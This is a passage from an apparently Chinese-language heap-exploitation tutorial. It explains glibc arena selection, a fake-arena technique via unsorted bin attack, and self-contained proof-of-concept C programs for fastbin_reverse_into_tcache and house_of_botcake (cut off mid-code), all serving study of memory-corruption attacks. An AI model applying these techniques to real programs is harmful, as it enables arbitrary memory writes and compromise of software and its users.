<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">arena_get</span>(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = <span class="built_in">arena_get_retry</span>(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) <span class="built_in">mutex_unlock</span>(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = <span class="built_in">arena_get2</span>(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get2</code> 函数中，如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate internal_function <span class="title">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">get_free_list</span>(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">catomic_compare_and_exchange_bool_acq</span>(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="built_in">catomic_decrement</span>(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = <span class="built_in">reused_arena</span>(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> narenas = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">reused_arena</span><span class="params">(mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">arena_is_corrupt</span>(result) &amp;&amp; !<span class="built_in">mutex_trylock</span>(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后两次调用 <code>malloc(0xffffffffffffffbf + 1)</code>，（第一次调用<code>result==&amp;main_arena;next_to_use==INTM</code>）; 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 <code>NULL</code>，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 <code>unsorted bin attack</code> 将 <code>narenas</code> 改成一个较大的数。为了确保从 <code>unsorted bin</code> 中取出的 <code>chunk</code> 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为<code> 0xffffffffffffffff</code> 。将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 <code>unsorted bin attack </code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205809961.png"
                      alt="image-20231027205809961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210017826.png"
                      alt="image-20231027210017826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205922973.png"
                      alt="image-20231027205922973"
                ></p>
<p>申请 <code>0xa0</code> 大小的 <code>chunk</code> （申请被构造在 <code>unsorted bin</code> 的 <code>INTM</code>）触发 <code>unsorted bin attack</code>。此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210544449.png"
                      alt="image-20231027210544449"
                ></p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将 <code>thread_arena</code> 指向我们伪造的 <code>INTM</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210759803.png"
                      alt="image-20231027210759803"
                ></p>
<p>伪造如下 <code>fast_chunk</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211024351.png"
                      alt="image-20231027211024351"
                ></p>
<p>之后将 <code>(uint64_t) (INTM_prev+0x30)</code> 指向伪造的 <code>chunk</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211133139.png"
                      alt="image-20231027211133139"
                ></p>
<p>此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211207749.png"
                      alt="image-20231027211207749"
                ></p>
<h1 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h1><p>第五部分开始使用 <code>ubuntu:18.04</code> 编译。<code>Tcache</code> 基础请看 <a class="link"   href="https://bbs.kanxue.com/thread-278105.htm" >Tcache安全机制及赛题详细解析(gundam &amp;&amp; House of Atum) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-19"><a href="#源码-19" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="built_in">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-19"><a href="#调试-19" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193723730.png"
                      alt="image-20231014193723730"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193755564.png"
                      alt="image-20231014193755564"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193900312.png"
                      alt="image-20231014193900312"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193928870.png"
                      alt="image-20231014193928870"
                ></p>
<p>首先申请 <code>14</code> 个 <code>chunk</code> ，先后将 <code>tcache</code> 和 <code>fastbinY[4]</code> 填满。其中 <code>victim</code> 指向第 <code>8</code> 个 <code>chunk</code> 也就是 <code>fastbinY[4]</code> 的最后一个 <code>chunk_ptrs[7]</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194618108.png"
                      alt="image-20231014194618108"
                > </p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194639500.png"
                      alt="image-20231014194639500"
                ></p>
<p>将 <code>victim(ptrs[7]_fd)</code> 指向 <code>stack_var[0]</code> 的位置，然后将 <code>tcache</code> 清空。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194826822.png"
                      alt="image-20231014194826822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195140863.png"
                      alt="image-20231014195140863"
                ></p>
<p>这次 <code>malloc</code> 将会先从 <code>fastbin</code> 头部取出一个 <code>chunk</code>，然后把 <code>fastbin</code> 清空，放入<code>tcache</code>中，因为 <code>fastbin</code> 取出时从头开始，<code>tcache</code> 又是 <code>FIFO</code> 结构， 所以放入 <code>tcache</code> 是倒序的，把 <code>stack_var</code> 也算做了一个 <code>chunk</code>，所以是满 <code>7</code> 个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195254059.png"
                      alt="image-20231014195254059"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195309680.png"
                      alt="image-20231014195309680"
                ></p>
<p>此时再去申请一个 <code>0x50</code> 大小的 <code>chunk</code> 将会把 <code>stack_var</code> 取出来，此时 <code>q == stack_var[2]</code> 。</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p><code>libc-2.29</code> 新增加<code>double free</code>检查，方法是在 <code>tcache_entry</code> 结构体中新增加标志位 <code>key</code> 来检查 <code>chunk</code> 是否在 <code>tcache bin</code> 中。当 <code>free</code> 掉一个堆块进入 <code>tcache</code> 时，假如堆块的 <code>bk</code> 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 <code>Tcache</code> ，假如发现同地址的堆块，则触发 <code>double Free</code> 报错。因为 <code>chunk</code> 的 <code>key</code> 保存在 <code>bk</code> 位置，只需将其修改即可绕过 <code>double free</code> 检查。而 <code>house_of_botcake</code> 是另一种方法。</p>
<h3 id="源码-20"><a href="#源码-20" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">sizeof</span>(x)/<span class="built_in">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span 